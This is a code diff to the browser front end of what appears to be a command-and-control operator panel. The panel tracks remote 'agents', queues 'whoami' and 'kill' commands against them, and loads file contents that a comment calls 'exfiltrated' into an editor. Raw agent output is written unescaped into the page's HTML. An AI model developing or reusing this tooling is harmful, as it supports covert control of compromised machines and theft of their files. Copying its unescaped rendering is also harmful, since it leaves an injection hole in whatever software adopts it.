@@ -368,16 +368,34 @@
     // This logic looks for the specific FILE_PULL output and puts it in the editor
     function renderResults(results) {
         const el = document.getElementById('results-feed');
-        const editor = document.getElementById('vault-editor');
-        // ... existing no-results check ...
+        const editor = document.getElementById('vault-editor'); // The ID from the new panel
+        
+        if (!results.length) {
+            el.innerHTML = '<div class="text-center text-muted py-4">No execution logs.</div>';
+            return;
+        }
+        
         el.innerHTML = '';
         results.forEach(r => {
-            // Auto-detect if this output is a file content we just pulled
+            // Check if this result contains exfiltrated file data
             if (r.output.includes("FILE_DATA_START")) {
-                const cleanContent = r.output.split("FILE_DATA_START")[1].split("FILE_DATA_END")[0];
-                editor.value = cleanContent.trim();
+                const parts = r.output.split("FILE_DATA_START");
+                const content = parts[1].split("FILE_DATA_END")[0];
+                
+                // Only update editor if it's currently empty to avoid overwriting mid-edit
+                if (editor.value.trim() === "" || editor.value.includes("File content will appear here")) {
+                    editor.value = content.trim();
+                }
             }
-            el.innerHTML += `<div class="item">...</div>`; // existing render logic
+
+            el.innerHTML += `
+                <div class="item">
+                    <div class="d-flex justify-content-between">
+                        <div><strong>${r.hostname}</strong> <span class="chip ${osChipClass(r.os_family)}">${r.os_family}</span></div>
+                        <span class="subtle">${r.timestamp}</span>
+                    </div>
+                    <pre class="result-out">${r.output}</pre>
+                </div>`;
         });
     }
 
@@ -399,55 +417,36 @@
         const assets = document.getElementById('opt-assets');
         const targetSelect = document.getElementById('target-select');
         
-        // 1. CAPTURE: Save what the user has currently selected
+        // Capture current selection before wipe
         const savedSelection = targetSelect.value;
 
         table.innerHTML = '';
         assets.innerHTML = '';
 
-        if (!agents.length) {
-            table.innerHTML = '<tr><td colspan="5" class="text-center text-muted py-4">No agents match filters.</td></tr>';
-            return;
-        }
-
         agents.forEach(a => {
-            // Check if this specific row should have the 'selected' highlight
             const isSelected = savedSelection === a.hostname;
-            
             table.innerHTML += `
                 <tr class="${isSelected ? 'selected' : ''}">
                     <td onclick="selectAgent('${a.hostname}')" style="cursor:pointer">
-                        <strong>${a.hostname}</strong>
-                        <div class="subtle">${a.ip || '-'}</div>
+                        <strong>${a.hostname}</strong><div class="subtle">${a.ip || '-'}</div>
                     </td>
-                    <td>
-                        <span class="chip ${osChipClass(a.os_family)}">${a.os_family}</span>
-                        <div class="subtle">${a.os}</div>
-                    </td>
+                    <td><span class="chip ${osChipClass(a.os_family)}">${a.os_family}</span><div class="subtle">${a.os}</div></td>
                     <td>${a.last_seen || '--:--:--'}</td>
                     <td><span class="dot ${statusClass(a.status)}"></span>${a.status}</td>
                     <td>
-                        <button class="btn btn-sm btn-outline-custom" onclick="triggerAction('${a.hostname}','whoami')">WHO</button>
-                        <button class="btn btn-sm btn-outline-custom" onclick="triggerAction('${a.hostname}','sysinfo')">INFO</button>
-                        <button class="btn btn-sm btn-outline-custom" onclick="triggerAction('${a.hostname}','netstat')">NET</button>
+                        <button class="btn btn-sm btn-outline-c2" onclick="triggerAction('${a.hostname}','whoami')">WHO</button>
                         <button class="btn btn-sm btn-outline-danger" onclick="triggerAction('${a.hostname}','kill')">KILL</button>
                     </td>
                 </tr>`;
-            
-            // Rebuild the dropdown options
-            const opt = document.createElement('option');
-            opt.value = a.hostname;
-            opt.textContent = a.hostname;
-            assets.appendChild(opt);
+            assets.innerHTML += `<option value="${a.hostname}">${a.hostname}</option>`;
         });
 
-        // 2. RESTORE: Force the dropdown back to what the user was looking at
-        // This prevents the "flicker" back to Broadcast All
-        if (savedSelection) {
+        // Restore selection so it doesn't jump back to Broadcast
+        if (savedSelection && savedSelection !== "ALL") {
             targetSelect.value = savedSelection;
         }
     }
-
+    
     function renderQueue(queue) {
         const el = document.getElementById('queue-list');
         if (!queue.length) {
